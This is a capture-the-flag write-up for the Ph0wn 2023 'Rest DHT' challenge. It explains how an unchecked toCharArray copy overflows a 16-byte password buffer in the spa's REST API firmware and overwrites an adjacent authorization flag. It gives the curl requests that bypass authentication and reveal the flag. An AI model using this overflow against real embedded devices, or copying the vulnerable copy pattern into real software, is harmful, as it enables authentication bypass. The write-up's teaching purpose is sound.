# Rest DHT by Cryptax

This challenge was part of Ph0wn CTF 2023. It was a *Pwn*, *Easy* challenge.

## Description of the challenge

```
Pico le Croco's spa is controlled via a REST API on http://xxxxxxx:8080 (local URL) + see code.
He wants to raise the temperature and humidity of his spa.
Can you help him be happy?

The **test** device which runs http://xxxx:8080 is meant to help you craft your exploit. You may not touch it.

Two **validation** devices, identical to the test one, are available on a table close the organizers (ask them if you can't locate it). You sit at that table, and use one of the devices to validate your exploit and get your flag.
The validation devices remain on that table at all times: you may *not* borrow them and take them away.
The validation stage is expected to be quick: test, flag and go. If you need more time, go back to the online test device. 
```

In addition, we are given a source code file: `spa.ino`.


## What we need to do

The flag is displayed if we manage to get high temperature and humidity. We touch the sensor, so there is no way we'll normally get such a high temperature and humidity.

```c
if (temperatureC > 60 && humidity > 100) {
    // get the flag
}
```

If we manage to manipulate *calibration* values, we'll be able to set temperature and humidity as high as we wish.

```c
temperatureC = rawC + calibrate_temp;
humidity = rawH + calibrate_hum;
```

## Calibrating

Unfortunately, calibration is a restricted operation which requires a password we do not have:

```c
// calibration is a restricted operation which requires credentials
void calibrate(bool temp) {
  checkArguments();
  unlock();
  if (! unlocked) {
    return server.send(401, "text/plain", F("Not authorized"));
  }
```

A correct calibration request must contain `pwd` (password) and `value` (calibration value) arguments.

```c
void checkArguments() {
  if (! server.hasArg("pwd") ) {
    server.send(401, "text/plain", F("Missing pwd"));
  }
  
  if (! server.hasArg("value") ) {
    return server.send(400, "text/plain", F("Missing calibration value"));
  }
}
```

We try and provide dummy data, but the password is (obviously) incorrect:

```
$ curl 'http://xxx:8080/calibrate/temperature?pwd=12&value=10'
Not authorized
```

## Spotting the vulnerability

Password checking occurs in the `unlock()` function:

```c
void unlock() {
  char secret[BUFFER_LEN] = CENSORED;
  String tmp_password = server.arg("pwd");
  tmp_password.toCharArray(password, tmp_password.length()+1);

  if (strncmp(password, secret, BUFFER_LEN-1) == 0) {
    Serial.println(F("Correct password!"));
    unlocked = true;
  }
}
```

Function `toCharArray` copies our input password (`tmp_password`) into global variable `password`. `password` is allocated 16 bytes (`BUFFER_LEN`), but `tmp_password` can be far longer and we copy all of it (`toCharArray` copies `tmp_password.length()+1` bytes). Consequently, we can *overflow* `password`.

```
#define BUFFER_LEN 16
bool unlocked = false;
char password[BUFFER_LEN];
```

If we *overflow* password, we can overwrite *unlocked* and make it become `true`.
This is confirmed by `/debug`:  the addresses of  `password` and `unlocked` are extremely close:

```
$ curl 'http://xxxxxx:8080/debug'
password addr= 3ffee5f0 value=
unlocked addr= 3ffee600 value=0
```

## Exploiting

To overflow the password, we need to provide more than 16 bytes. Let's provide 17 bytes, with 17th byte being `A`, a non-null value to overflow `unlocked` with a value different than 0:

```
 curl 'http://xxxxx:8080/calibrate/temperature?pwd=1234567890123456A&value=100'
Temperature calibration done
```

It works! We can confirm the overflow worked:

```
$ curl 'http://xxxx:8080/debug'
password addr= 3ffee5f0 value=1234567890123456A
unlocked addr= 3ffee600 value=65
```

To get the flag, we must calibrate humidity as well:

```
$ curl 'http://xxxx:8080/calibrate/humidity?pwd=1234567890123456A&value=100'
Humidity calibration done
```

Then, we read:

```
$ curl 'http://xxxx:8080/data'
Prepare your exploit and read the flag on serial port
```

Connect to the serial port with `picocom /dev/ttyUSB0 -b 115200`. Do the exploit again:

```
[+] HTTP REST server started on port 8080
[+] calibrate_hum=100.00
[+] calibrate_temp=100.00
Congrats! Here is your flag: ph0wn{w0w_your_spa_is_hot++}
[+] reset() done
```
\newpage
